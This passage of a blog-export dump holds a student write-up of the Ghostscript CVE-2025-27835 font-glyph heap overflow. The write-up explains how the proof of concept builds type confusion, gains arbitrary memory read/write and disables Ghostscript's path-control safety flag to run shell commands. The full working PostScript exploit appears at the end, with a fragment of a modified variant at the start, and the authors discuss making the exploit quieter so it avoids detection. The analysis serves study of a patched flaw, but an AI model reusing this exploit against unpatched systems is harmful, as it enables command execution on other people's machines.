/ptr10 ptr3 80 ptradd def ptr10 buf5 42496 ptradd arbwr buf4 -190688 ptradd \u0026lt;01\u0026gt; arbwr (actually done) = flush quit } def % DONE /MAIN { /Myfont \u0026lt;\u0026lt; /FontName /Myfont /FontType 1 /FontMatrix [1 0 0 1 0 0] /Private \u0026lt;\u0026lt; /lenIV -1 /Subrs [ \u0026lt;0E\u0026gt; ] \u0026gt;\u0026gt; /Decoding 0 /Encoding [ /cs0 /cs1 /cs2 ] /CharStrings \u0026lt;\u0026lt; /.notdef \u0026lt;0E\u0026gt; /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put } /cs1 \u0026lt;0E\u0026gt; /cs2 { DONE } \u0026gt;\u0026gt; /WeightVector [1] /$Blend {} /FontInfo \u0026lt;\u0026lt; /BlendAxisTypes [ /foo ] /BlendDesignPositions [[1]] /BlendDesignMap [[[1]]] /GlyphNames2Unicode \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; /Blend \u0026lt;\u0026lt; /FontBBox [[1]] /Private \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; .buildfont1 /FONT exch def /FONTNAME exch def FONT setfont (init) = flush /TEXT 625000 string def /SOURCE2 4000002 string def /SOURCE1 4000002 string def SOURCE2 REFOFS \u0026lt;7e12\u0026gt; putinterval FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put FONT /CharStrings get /.notdef undef TEXT 0 0 put TEXT 1 2 put (trigger) = flush 0 750 moveto TEXT show } def % MAIN MAIN quit ","date":"27 June 2025","externalUrl":null,"permalink":"/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/","section":"Posts","summary":"","title":"Making Ghostscript CVE-2025-27835 PoC Usable","type":"posts"},{"content":"","date":"27 June 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"27 June 2025","externalUrl":null,"permalink":"/","section":"Richard's Blog","summary":"","title":"Richard's Blog","type":"page"},{"content":"","date":"27 June 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Goal # This is a report diving into CVE-2025-27835, a vulnerability in Ghostscript that allows for arbitrary command execution. This report was done with the help of members from the UMass Cybersecurity Club (Lina Li , Larry Liu , Alex Tong , and Katherine Shi ) as part of a final group project for the Reverse Engineering \u0026amp; Understanding Exploit Development course.\nWe are not claiming to have found this vulnerability, this is just a report of the Proof of Concept exploit code! We analyzed CVE-2025-27835, a known buffer overflow vulnerability in Artifex Ghostscript versions prior to 10.05.0 that occurs in line 256 of the psi/zbfont.c file, part of a function that converts font glyphs to Unicode (gs_font_map_glyph_to_unicode). Our objective was to understand the mechanisms involved in the exploit, the choices the author of the exploit made, and attempt to improve upon the supplied exploit.\nExploit # The vulnerability is a buffer overflow that occurs on a memcpy call. The destination buffer is of type unsigned char and allocates space accordingly, but it copies l * sizeof(short) bytes. Since unsigned chars are 1 byte and shorts are 2 bytes in C, a buffer overflow occurs by copying twice the amount of data.\nAfter reviewing the source code, we hypothesize that the developer made the mistake by thinking that the number of bytes needed to represent a UTF-16 character is twice the size of the source string. However, in this function, l is already treated as the number of bytes of the source string. Thus, the function copies twice as much memory as intended, causing a heap overflow.\nTriggering Conditions # The exploit happens when specifically crafted fonts are used. Fonts are used in ghostscript to interpret PDF data or render/generate PDFs from text data. When a font is loaded and used, the buffer overflow will occur if:\nThe font has a GlyphNames2Unicode dictionary The mapping of glyphs is unsuccessful (c == 0) The font is not a CIDFont (ch != -1) The GlyphNames2Unicode dictionary must contain the value of ch as an integer key in the dictionary Key ch in the dictionary gives value v, which is a string The size of v is smaller than or equal to length (l \u0026lt;= length) Proof of Concept Exploit # The full exploit code can be found at the end of this report.\nRunning the exploit with the provided command will run ls:\ngs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps\nGhostscript Internals # Postscript allows you to create your own variables, arrays, strings, and various other types. To manage all the different types, Ghostscript creates a struct for every variable.\nAlmost everything in Ghostscript (variables, functions, fonts, etc) is of a type struct ref_s, which contains a struct tas_s and union. The tas_s struct contains two important variables: type_attrs (the type of object it is, i.e. an array, a string, a font, a number, etc) and rsize (the amount of size in bytes it would take to represent the thing in memory). A 19 field union is also part of the struct, allowing for data of all different types.\nBelow is the struct definition and an example object of type array (as denoted in the type_attrs). It is of size 32, and its value is simply a pointer to the array. In this exploit we will only deal with strings and arrays. Strings contain a pointer to the string itself, while arrays contain a pointer to an array of ref_s structs (each of which may contain more pointers).\nref_s ptype: ref_s example variable: As some extra context, Ghostscript allows for the execution of bash commands, but it is considered unsafe, so by default, the -dSAFER flag is enabled to prevent the execution of arbitrary commands. This flag can be disabled using the -dNOSAFER flag. The main goal of most Ghostscript exploits is to bypass this to achieve command execution. We will see later that this flag corresponds to a specific field in a gs_lib_ctx_core_t struct.\nIt also uses a similar allocator to dlmalloc, so the header data is inline with the chunks.\nExploitation # Global Variable Setup # Postscript is an interpreted language, therefore, we first need to define a max virtual memory threshold to allocate for the interpreter. The exploit PoC sets this to 500000000\n500000000 setvmthreshold Next, the author defines two global variables REFIDX and REFOFS with values 249888 and 3248640 respectively, at hardcoded addresses. We’ll see later on the significance of the values to the exploit.\n/REFIDX 249888 def /REFOFS 3248640 def Three more global variables are defined below, with STROBJ being a string of size 1000, ARROBJ being an array of size 6250, and OBJARR being an array of size 32. While STROBJ and OBJARR don’t need precise sizes, ARROBJ must be size 6250 so we can search for the malloc chunk header size field once we get arbitrary read/write.\n/STROBJ 1000 string def /ARROBJ 6250 array def /OBJARR 32 array def Below is a diagram of the initialized objects in memory, and under that is the definition for ref_s definition for reference.\nBelow, you can see the values of OBJARR, STROBJ, and ARROBJ from top to bottom. Since STROBJ is at the start of OBJARR, the pointer of OBJARR points directly to it. ARROBJ is 16 bytes after that, since sizeof(ref_s) is 16. We can verify these are correct but looking at tas-\u0026gt;rsize since all three variables have distinct sizes.\nOBJARR:\nARROBJ:\nSRTOBJ:\nThe next two lines set the first two elements of OBJARR to STROBJ and ARROBJ respectively.\nOBJARR 0 STROBJ put OBJARR 1 ARROBJ put Finally, to conclude the global variable setup, the exploit author declares 4 variables TARGET, MAGIC, STRPTR, and ARRPTR that will be used later.\nThe full global variable setup is shown below:\n500000000 setvmthreshold /REFIDX 249888 def /REFOFS 3248640 def /STROBJ 1000 string def /ARROBJ 6250 array def /OBJARR 32 array def OBJARR 0 STROBJ put OBJARR 1 ARROBJ put /TARGET null def /MAGIC null def /STRPTR null def /ARRPTR null def Main Set Up # Font Creation # The exploit makes use of a custom Type 1 Font definition and a buffer overflow in the form of the vulnerable memcpy in psi/zbfont.c in order to hijack execution to invoke a call to the custom defined DONE function.\nA font program in PostScript is a collection of commands that describe character shapes that can be accessed using the show operator. Given a font program definition, the PostScript interpreter can render the font in a device-independent manner.\nThe exploit author makes use of a Type 1 Font, a specific font program consisting of ASCII text, encoded, and encrypted portions. Type 1 Font is defined by a dictionary with many required and optional entries, but we’ll just go over the entries most relevant to the exploit.\nIn the main function, we create a new font with specific data:\n/FontName: Name of the font /FontType 1: Type 1 font (glpyh-based, standard for scalable fonts) /FontMatrix: Cooridinate transformation matrix ( identity here = no scaling/skewing) /Private \u0026lt;\u0026lt; /lenIV -1 /Subrs [ \u0026lt;0E\u0026gt; ] \u0026gt;\u0026gt;\nType 1 fonts encrypt their charstrings where lenIV tells the interpreter how many bytes of random prefix to strip before interpreting the glyph data.By setting /lenIV to -1, this disables this setting so charstrings will not be encrypted for this font.\n/Subrs is usually for local subroutines in charstrings, and is set here as \u0026lt;0E\u0026gt; which is an endchar operator in Type 1 charstrings\n/Encoding [ /cs0 /cs1 /cs2 ]\nDefines an array in the font dictionary to obtain the name (and associated commands) of the character to be built. The BuildChar operation (which will, unsurprisingly, construct the custom font character), when called on, will reference the name in /Encoding to build the corresponding key in the /CharStrings dictionary.\n/CharStrings \u0026lt;\u0026lt; /.notdef \u0026lt;0E\u0026gt; /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put } /cs1 \u0026lt;0E\u0026gt; /cs2 { DONE } \u0026gt;\u0026gt; Defines the behavior or data for each glyph as a dictionary. /CharStrings is one of two encrypted portions in the font program (the other being the /Private dictionary). It contains the encoded commands to draw the outlines of the characters within the font. There are a few interesting things to note about what the exploit author does with /CharStrings in this instance. First, we’ll notice that /.notdef \u0026lt;0E\u0026gt; sets glyph code 0 (a required entry in a valid Type 1 Font) to \u0026lt;0E\u0026gt;, which ensures that when an encoding that does not exist in the font program is called, .notdef will be substituted to give feedback that the glyph does not exist in the font. Next, we see that cs0 seems to be setting up some variables:\n/cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put }\nSpecifically the encoding cs0 will place 1 in the 0th index of TEXT (i.e. TEXT[0] = 1), and define an array TARGET where TARGET[REFIDX] = OBJARR. The motivation for TEXT[0] = 1 is to set up TEXT such that it encodes a glyph whose name maps to cs0.\n/cs1 \u0026lt;0E\u0026gt;\nSimilar to /.notdef, allocates the smallest valid character that does nothing (we believe that 0e is a reserved endchar operator, but could only find sources on this related to Type 2 Operators). We found that you could edit \u0026lt;0E\u0026gt; and replace it to any number like 3250 and the exploit would still execute properly. We hypothesized that the exploit author simply paired cs1 to \u0026lt;0E\u0026gt; for simplicity and guaranteed no operation (endchar) in this case.\n/cs2 { DONE }\nThis calls the custom defined /DONE function.\n/WeightVector [1]\nThis option in the font creation doesn\u0026rsquo;t seem to have any effect on the exploit.\n/$Blend {}\nThis option in the font creation doesn\u0026rsquo;t seem to have any effect on the exploit.\n/FontInfo \u0026lt;\u0026lt; /BlendAxisTypes [ /foo ] /BlendDesignPositions [[1]] /BlendDesignMap [[[1]]] /GlyphNames2Unicode \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; Is another dictionary that contains 4 elements. All except the /GlyphNames2Unicode dictionary seem to be unimportant. /GlyphNames2Unicode is what keeps the mappings from glyphs to actual characters.\n/Blend \u0026lt;\u0026lt; /FontBBox [[1]] /Private \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; Is another dictionary that contains 2 elements. Both seem to be unimportant.\nFull Font Definition Code # /Myfont \u0026lt;\u0026lt; /FontName /Myfont /FontType 1 /FontMatrix [1 0 0 1 0 0] /Private \u0026lt;\u0026lt; /lenIV -1 /Subrs [ \u0026lt;0E\u0026gt; ] \u0026gt;\u0026gt; /Decoding 0 /Encoding [ /cs0 /cs1 /cs2 ] /CharStrings \u0026lt;\u0026lt; /.notdef \u0026lt;0E\u0026gt; /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put } /cs1 \u0026lt;0E\u0026gt; /cs2 { DONE } \u0026gt;\u0026gt; /WeightVector [1] /$Blend {} /FontInfo \u0026lt;\u0026lt; /BlendAxisTypes [ /foo ] /BlendDesignPositions [[1]] /BlendDesignMap [[[1]]] /GlyphNames2Unicode \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; /Blend \u0026lt;\u0026lt; /FontBBox [[1]] /Private \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; Font Usage # After defining the font, the next step is to use it. In order to do this, the font needs to be built and set as the current font.\n.buildfont1 /FONT exch def /FONTNAME exch def FONT setfont The .buildfont1 operator takes a font dictionary from the stack and constructs a font object. The constructed font object is then stored in the variable FONT, and its name is stored in FONTNAME. Finally, FONT is set as the current font using the setfont operator.\nAfter setting the font, the exploit author does more setup in /MAIN. The next lines initializes three strings:\n/TEXT 625000 string def /SOURCE2 4000002 string def /SOURCE1 4000002 string def TEXT is a string of size 625000, while SOURCE1 and SOURCE2 are strings of size 4000002. The sizes of SOURCE1 and SOURCE2 are important because they will be used to trigger the buffer overflow in the vulnerable memcpy call.\nThe ref_s variables corresponding to these three local variables are right next to each other in the Postscript virtual memory, and their buffers are at fixed “offsets” from each other (we will see later that these offsets are just padding). The way this looks like in memory, the tas_s struct of each variable will contain the type of the variable (so they all have type string) and the rsize field in each variable’s tas_s struct 625000 or 4000002. The image below is the value of the SOURCE1 ref_s variable.\nSOURCE2 REFOFS \u0026lt;7e12\u0026gt; putinterval\nThe program then calls the Postscript putinterval operator to put the value 0x127e at index 3248640 in SOURCE2, which is an important thing to keep in mind for later. This is done in the function do_call_operator with the address of the Postscript function to run, in this case zputinterval with arguments SOURCE1, SOURCE2, and index. The heap has been set up in a deterministic way such that we are able to hardcode the REFOFS value as well, as we will see later. ASLR loads modules at a different address every time, but all important objects are fixed relative to /TARGET (which is the struct object the buffer overflow is targeting) stay the same.\nThe most important part of the main function is the next line:\nFONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put\nTranslating this to more readable code, it means get the /FontInfo variable from the FONT in which we then get the /GlyphNames2Unicode dictionary from /FontInfo which shortens the code to:\n/GlyphNames2Unicode 1 SOURCE1 put\nAnd all this does is put the variable SOURCE1 into the the second mapping of /GlyphNames2Unicode, effectively mapping 1 to SOURCE1, so /GlyphNames2Unicode looks like this after (using this line in our font’s definition instead of using put also works):\n/GlyphNames2Unicode \u0026lt;\u0026lt; 1 SOURCE1 \u0026gt;\u0026gt; So the glyph for 1, which is cs1, will be mapped to SOURCE1. This is important because this mapping NEEDS to be this specifically for the exploit to work or else the buffer is incorrectly written.\nIn the next line, we undefine the ./notdef glyph in the font’s /CharacterCode dictionary. This means that the font will never execute that glyph when the font encounters some undefined character code.\nWe then fill up the TEXT variable to be the character codes we want to run so it sets TEXT = [0x0, 0x2, 0x0 …]. Then we set the position of the cursor to an arbitrary location so we can start rendering text.\nTriggering the Exploit # Finally, we run the heart of the exploit by attempting to display the TEXT variable using the specially crafted font.\nBecause TEXT = [0x0, 0x2, 0x0 …], it will run the code for the glyph that corresponds to character code 0, which is cs0. It will then run the code for the glyph that corresponds to the character code 2, which is cs2. Looking at cs0, the first thing it does is:\nTEXT[0] = 1\nNow the code in /MAIN has just set TEXT = [0x0, 0x2]. So, after this command, it is now\nTEXT = [0x1, 0x2] The code then creates a 312500 element array named TARGET which is used later in the exploit. Finally, it places OBJARR into TARGET at offset REFIDX. As such, TARGET[249888] is a copy of OBJARR (important for type confusion). We found that REFIDX accounts for the empty space between unicode_return and TARGET (which we will see later). The heap buffers have been specially crafted in such a way that this hardcoded value works consistently.\nAfter cs0 finishes, our assumption is that it attempts to display the output of cs1 before running the code for cs2,. However, since the value at TEXT[0] had changed in between to 1, it now will display the glyph for character code 1, which is \u0026lt;0E\u0026gt;, instead of going to cs2. Since glyph 1 has no mapping in /CharStrings, there would be an error. Normally, the font would see that character code 1 has no mapping and would move to the execution of /.notdef. However, because the script had previously undefined it, it attempts to fall back on the /GlyphNames2Unicode dictionary which runs gs_font_map_glyph_to_unicode to attempt to get the Unicode UTF-16 code for a glyph, which we presume occurs because it maps cs1 or 0E to SOURCE1. This triggers the overflow and overwrites data from SOURCE1 and SOURCE2 (which we control) into the target buffer, which is stored closeby to unicode_return. Specifically, it overwrites the type of the OBJARR ref we placed in TARGET.\nThe Exploit # Looking at the vulnerable code again, we see that we are copying from a buffer in v to unicode_return.\nmemcpy(unicode_return, v-\u0026gt;value.const_bytes, l * sizeof(short)); unicode_return is temporarily allocated one function up, in txt_get_unicode, and v is a Ghostscript variable that we control. With dynamic analysis, we found that v is SOURCE1, meaning that v-\u0026gt;value.const_bytes is a buffer of size 4000002.\nunicode = (ushort *)gs_alloc_bytes(dev-\u0026gt;memory, length, \u0026#34;temporary Unicode array\u0026#34;); length = font-\u0026gt;procs.decode_glyph((gs_font *)font, glyph, ch, unicode, length); Looking at how unicode_return was allocated, we can see that it is also of size length (4000002). Thus, we are copying past the end of SOURCE1 into a space past the end of unicode_return. As mentioned earlier, we set up TARGET and SOURCE2 such that they would be in these spaces.\nLooking at the diagram, it is clearer that REFIDX is the index of our target (copy of OBJARR) in TARGET, and REFOFS is the offset of our overwrite (0x127e, which corresponds to type string).\nThis size of SOURCE1 was specially chosen. The last 4 bytes of the memcpy will overwrite the type field of the variable OBJARR. Before the overflow occurs, OBJARR had a type of 0x04 which corresponds to a t_array. But we overwrote it to 0x12, setting it to of type string. However, as we will later see, this also overwrites the malloc and clump headers of TARGET, which will cause Ghostscript to crash when trying to clean up.\nAs you can see in the image, the reason TARGET is initialized in /cs0 and not before we trigger the exploit is because we need TARGET to consistently be right after unicode_return.\nAs a brief aside, we investigated how the allocator works and why there are 750000 zero bytes in between SOURCE1 and SOURCE2 to understand more on why we set them up in a specific order with specific indices. Looking at the space before SOURCE2, we can find that there are headers corresponding to gs_malloc_block_t, and more specifically, the headers contain pointers, size, and a client name that is “large string clump”.\n// /base/gsmalloc.h 25 /* Define a memory manager that allocates directly from the C heap */ 26 typedef struct gs_malloc_block_s gs_malloc_block_t; // /base/gsmalloc.c 89 /* We must make sure that malloc_blocks leave the block aligned. */ 90 /*typedef struct gs_malloc_block_s gs_malloc_block_t; */ 91 #define malloc_block_data\\ 92 gs_malloc_block_t *next;\\ 93 gs_malloc_block_t *prev;\\ 94 size_t size;\\ 95 gs_memory_type_ptr_t type;\\ 96 client_name_t cname 97 struct malloc_block_data_s { 98 malloc_block_data; 99 }; 100 struct gs_malloc_block_s { 101 malloc_block_data; 102 /* ANSI C does not allow zero-size arrays, so we need the following */ 103 /* unnecessary and wasteful workaround: */ 104 #define _npad (-size_of(struct malloc_block_data_s) \u0026amp; (ARCH_ALIGN_MEMORY_MOD - 1)) 105 byte _pad[(_npad == 0 ? ARCH_ALIGN_MEMORY_MOD : _npad)]; 106 #undef _npad 107 }; We can see that our large strings are being allocated with the alloc_acquire_clump function using a size of asize.\nAlthough asize is calculated using a lot of unreadable bit manipulation, we can see that it is approximately 750000 more bytes than what we requested (nbytes).\nCombined with the fact that allocations are page aligned, the reason why there is a 751358 bytes in between SOURCE1 and SOURCE2 is because of Ghostscript’s i_alloc_string_immovable function.\nWe experimented with allocating different sized strings and seeing where they were placed in memory, and noticed that strings less than around 250000 length are placed in the normal Ghostscript heap.\nWith further analysis, we found that malloc decides whether strings are put on the heap or in their own clumps, which explains why the author uses 4000000 sized strings.\nAdditionally, the reason there is no padding between unicode_return and TARGET is because it is created using a different allocator function (alloc_obj instead of i_alloc_string).\n/DONE Function: Type Confusion For Arbitrary Reads and Writes # After all of this is done, the program renders 2 from TEXT using /cs2, which just calls the /DONE function.\nFrom the buffer overflow of /cs0 and /cs1, we can see that we now have 2 references to the same array, but of different types.\nType confusion is a common strategy used in VM escapes. In this case, the exploit is using it to achieve arbitrary reads and writes. By changing the type to a string we can modify the pointer of STROBJ to read/write from any location in memory.\nTARGET[REFIDX] contained a copy of OBJARR in /cs0 and now /DONE makes use of this for the next steps of the exploit. It sets MAGIC to TARGET[REFIDX], so MAGIC points to the same thing OBJARR, except that it is of type string.\nNext it defines two more variables STRPTR and ARRPTR. The exploit first grabs the substring of MAGIC using the getinterval operator, starting from the 8th character and ending at the 15th character and sets it to STRPTR. Since MAGIC is of type string, using getinterval will “take the substring” by making a new pointer to that substring.\nFirst element: OBJARR[0]\tMAGIC[0:8] = STROBJ tas struct\tMAGIC[8:16] = ptr to STROBJ string\tSecond element: OBJARR[1]\tMAGIC[16:24] = ARROBJ tas struct\tMAGIC[24:32] = ptr to ARROBJ array In the end, STRPTR is just a pointer to STROBJ's pointer and ARRPTR is just a pointer to ARROBJ's pointer. Therefore, if we write to STRPTR's string, then we overwrite STROBJ's pointer.\nAs a small note, /arrptr and /ARRPTR do the exact same thing, as they are both of type string and point to ARROBJ’s pointer.\nWe now define some functions to leverage this type confusion.\n/copystr: simply takes two strings and copies data from one to another /copystr { /_length exch def /_srcidx exch def /_srcstr exch def /_dstidx exch def /_dststr exch def _length { _dststr _dstidx _srcstr _srcidx get put /_srcidx _srcidx 1 add def /_dstidx _dstidx 1 add def } repeat } bind def /ptradd: takes a string variable in which its value is a pointer (say pointer A) and increments A by an amount /ptradd { /_inc exch def /_ptr exch def /_new 8 string def 0 1 7 { /_i exch def /_b _ptr _i get _inc add def /_inc _b -8 bitshift def _new _i _b 255 and put } for _new } bind def /arbrd: overwrites the pointer of STROBJ by writing to STRPTR, and then reads what STROBJ is pointing at by accessing it from OBJARR /arbrd { /_buf exch def /_adr exch def STRPTR 0 _adr 0 8 copystr _buf 0 OBJARR 0 get 0 _buf length copystr } bind def /arbwr: does the same thing as arbrd, but writes to what STROBJ is pointing at instead of reading it /arbwr { /_buf exch def /_adr exch def STRPTR 0 _adr 0 8 copystr OBJARR 0 get 0 _buf 0 _buf length copystr } bind def Disabling the security flags # Now our goal is to locate the security flags. We do this by traversing the malloc headers, which form a doubly linked list. This is easily done with the plist command in pwndbg:\n{ /arrsz 8 string def /next arrptr -40 ptradd -48 ptradd def next 16 ptradd arrsz arbrd arrsz \u0026lt;d886010000000000\u0026gt; eq { exit } if % 100056 /next arrptr -56 ptradd -48 ptradd def next 16 ptradd arrsz arbrd arrsz \u0026lt;e886010000000000\u0026gt; eq { exit } if % 100072 (unknown header layout) = quit } loop We first check at an offset -88 and -104 from the start of OBJARR, checking if the value at that offset is equal to the size of ARROBJ to verify which type of chunk header layout Ghostscript is using (in 10.04.0’s case it is offset -88). (This is the whole reason why ARROBJ must be size 6250, since we check if it’s size 0x186d8 = 16*6250 + 56). At both of these offsets, the PoC then checks for the size for that malloc block (100056/0x186d8 and 100072/0x186e8) which can be seen in the image above as the first two malloc chunk headers in the list. If the size check passes, then the exploit code can continue knowing the pointer is a valid malloc chunk header.\nOnce again, we are traversing the malloc chunk headers linked list, searching for one where the next node has a cname equal to “gs_lib_ctx_init(core)”. Note that the *next pointer is offset 0 from the structure and cname is offset 32 from the structure. The node with the matching string seems to always be the third to last node in the linked list and the linked list seems to be a bit short of 500 nodes each time.\nAfter finding the correct pointer, the exploit stores it in the vairable head. 48 bytes after head is a struct of type gs_lib_ctx_core_t which contains a field called “is_path_control_active” which is a boolean that will let Postscript execute arbitrary commands. The exploit then sets this field to 0, thus allowing the execution of arbitrary commands.\nFlag before being turned off:\nFlag after being turned off:\nThis is effectively the end of the exploit, as all thats left to do is run any command we want. In the case of the PoC, it runs ls and prints the output to the terminal but this could be any command such as a reverse shell, creating a cronjob, reading a file, etc.\n(%pipe%ls -laf) (w) file As a summary of everything the exploit just did:\nInitialized OBJARR, STROBJ, ARROBJ, and TARGET such that it would be able to arbitrarily read/write and get malloc header primitives after the buffer overflow. Created a malicious font with SOURCE1 and SOURCE2 to conduct a buffer overflow onto a copy of OBJARR in TARGET, setting its type to a string. Used the type confusion to traverse the malloc chunk linked list until we find gs_lib_ctx_init(core) Overwrote the path_control_active field in the context struct and execute arbitrary commands Next Steps # The very last thing the exploit does is infinite loop in Postscript:\n{ 1 pop } loop When Ghostscript files are run, they will typically exit back to the interpreter. However, after executing our payload, it will enter into an infinite loop (intentionally). This is because the interpreter will crash (yes actually segfault) if we attempt to exit from the script, as we overwrite the header data for the clump containing /target during our buffer overflow. This is interesting because Ghostscript actually handles crashes and will exit gracefully if something goes wrong.\nSegfault: Graceful crash: When the interpreter tries to clean up the GhostScript heap, it will try to clean up the overwritten chunk and crash when it tries to access the nonexistent header data.\nBefore buffer overflow: After buffer overflow: Our goal was to edit the PoC such that the interpreter doesn’t crash or hang after the execution of the script so that the exploit can remain undetected. Obviously the point of a PoC is just to show that the exploit actually works but we wanted to see how someone would go about making it useful in a real world scenario.\nWe had two avenues to investigate: Controlling the data that the clump header data is overwritten with, or preventing Ghostscript from trying to clean up the clump.\nAttempts to control the data that overwrites the clump header data weren’t fruitful. We needed a way to control the 1760 bytes of data immediately after the data of SOURCE1 (specifically the 60 or so bytes at the end), so that we could repair the clump data for the clump containing /target. We tried to resize the variables in the exploit so that SOURCE1’s data ended up adjacent to other data that we controlled. We found that the variables were simply positioned in the order that they were defined/allocated. However, as discussed earlier, the clumps that we are working with only accept larger sizes (\u0026gt; ~250000 bytes), while smaller sized allocations go on the normal heap or other clumps. Additionally, since Ghostscript allocates a large amount of padding to the data for refs that scales with the size of the allocation, we found that we would not be able to get controllable data into the 1760 bytes, as any data adjacent to SOURCE1 would be padding data of length \u0026gt; 1760.\nWe then attempted to attack the heap. Further investigation revealed that the pointer to the clump is stored in the (non-Ghostscript) heap. This was promising, as we could potentially use the read/write primitives to overwrite the heap such that it loses the reference to the corrupted clump, potentially delaying or even preventing a crash. The crash happens in the gc_objects_clear_marks function called by gs_gc_reclaim. gs_gc_reclaim attempts to go through the objects in each clump and mark them to be freed or consolidated. It does this by traversing through the tree that contains references to every clump. However, references to adjacent nodes, as well as other data, are only stored in the header data for each clump, which are located on the Ghostscript heap. This is inaccessible to our read/write primitives, which stopped us in our tracks. The pointer for every clump is stored on the normal heap, so in theory if we can find some other structure in the heap containing the clumps or find the section in memory where they are stored, we can attempt to traverse it and linearly search for a clump with data unique to the clump (if any exists on the heap) or by its order. which is very far in the heap memory. Ultimately, we didn’t have the time to fully test this approach to see if it would be feasible, but any implementation would also likely be difficult to get consistently working, as it would be sensitive to variations in ordering on the heap or Ghostscript heap (i.e. if the interpreter was used before running the exploit).\nImpact # This affects all x64 Linux systems running Ghostscript versions prior to 10.05.0. The exploit also worked on an ARM 7.2 machine (again running Ghostscript versions prior to 10.05.0).\nMitigations # GhostScript v10.05.1 Official Patch # As of GhostScript version 10.05.1, the exploit has been patched by changing the vulnerable memcpy line from copying l * sizeof(short) to simply l bytes.\nReferences # Source Code Ghostscript 10.04.0 CVE Bug Report Patch pwndbg Full Proof of Concept Code # % gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps 500000000 setvmthreshold /REFIDX 249888 def /REFOFS 3248640 def /STROBJ 1000 string def /ARROBJ 6250 array def /OBJARR 32 array def OBJARR 0 STROBJ put OBJARR 1 ARROBJ put /TARGET null def /MAGIC null def /STRPTR null def /ARRPTR null def % \u0026lt;dststr\u0026gt; \u0026lt;dstidx\u0026gt; \u0026lt;srcstr\u0026gt; \u0026lt;srcidx\u0026gt; \u0026lt;length\u0026gt; copystr - /copystr { /_length exch def /_srcidx exch def /_srcstr exch def /_dstidx exch def /_dststr exch def _length { _dststr _dstidx _srcstr _srcidx get put /_srcidx _srcidx 1 add def /_dstidx _dstidx 1 add def } repeat } bind def % \u0026lt;string\u0026gt; \u0026lt;int\u0026gt; ptradd \u0026lt;string\u0026gt; /ptradd { /_inc exch def /_ptr exch def /_new 8 string def 0 1 7 { /_i exch def /_b _ptr _i get _inc add def /_inc _b -8 bitshift def _new _i _b 255 and put } for _new } bind def % \u0026lt;string-address\u0026gt; \u0026lt;string-buffer\u0026gt; arbrd - /arbrd { /_buf exch def /_adr exch def STRPTR 0 _adr 0 8 copystr _buf 0 OBJARR 0 get 0 _buf length copystr } bind def % \u0026lt;string-address\u0026gt; \u0026lt;string-data\u0026gt; arbwr - /arbwr { /_buf exch def /_adr exch def STRPTR 0 _adr 0 8 copystr OBJARR 0 get 0 _buf 0 _buf length copystr } bind def /DONE { /MAGIC TARGET REFIDX get def /STRPTR MAGIC 8 8 getinterval def /ARRPTR MAGIC 24 8 getinterval def (patch) = flush /arrptr 8 string def arrptr 0 ARRPTR 0 8 copystr { /arrsz 8 string def /next arrptr -40 ptradd -48 ptradd def next 16 ptradd arrsz arbrd arrsz \u0026lt;d886010000000000\u0026gt; eq { exit } if % 100056 /next arrptr -56 ptradd -48 ptradd def next 16 ptradd arrsz arbrd arrsz \u0026lt;e886010000000000\u0026gt; eq { exit } if % 100072 (unknown header layout) = quit } loop { /head next def /next 8 string def /cname 8 string def /cname_str 21 string def head next arbrd head 32 ptradd cname arbrd cname cname_str arbrd cname_str (gs_lib_ctx_init(core)) eq { exit } if } loop /buf 4 string def /ptr1 head 188 ptradd def /ptr2 head 204 ptradd def ptr1 buf arbrd buf \u0026lt;01000000\u0026gt; eq { ptr1 \u0026lt;00000000\u0026gt; arbwr } if ptr2 buf arbrd buf \u0026lt;01000000\u0026gt; eq { ptr2 \u0026lt;00000000\u0026gt; arbwr } if (exec) = flush (%pipe%id) (w) file (done) = { 1 pop } loop quit } def % DONE /MAIN { /Myfont \u0026lt;\u0026lt; /FontName /Myfont /FontType 1 /FontMatrix [1 0 0 1 0 0] /Private \u0026lt;\u0026lt; /lenIV -1 /Subrs [ \u0026lt;0E\u0026gt; ] \u0026gt;\u0026gt; /Decoding 0 /Encoding [ /cs0 /cs1 /cs2 ] /CharStrings \u0026lt;\u0026lt; /.notdef \u0026lt;0E\u0026gt; /cs0 { TEXT 0 1 put /TARGET 312500 array def TARGET REFIDX OBJARR put } /cs1 \u0026lt;0E\u0026gt; /cs2 { DONE } \u0026gt;\u0026gt; /WeightVector [1] /$Blend {} /FontInfo \u0026lt;\u0026lt; /BlendAxisTypes [ /foo ] /BlendDesignPositions [[1]] /BlendDesignMap [[[1]]] /GlyphNames2Unicode \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; /Blend \u0026lt;\u0026lt; /FontBBox [[1]] /Private \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; \u0026gt;\u0026gt; .buildfont1 /FONT exch def /FONTNAME exch def FONT setfont (init) = flush /TEXT 625000 string def /SOURCE2 4000002 string def /SOURCE1 4000002 string def SOURCE2 REFOFS \u0026lt;7e12\u0026gt; putinterval FONT /FontInfo get /GlyphNames2Unicode get 1 SOURCE1 put FONT /CharStrings get /.notdef undef TEXT 0 0 put TEXT 1 2 put (trigger) = flush 0 750 moveto TEXT show } def % MAIN MAIN quit ","date":"10 May 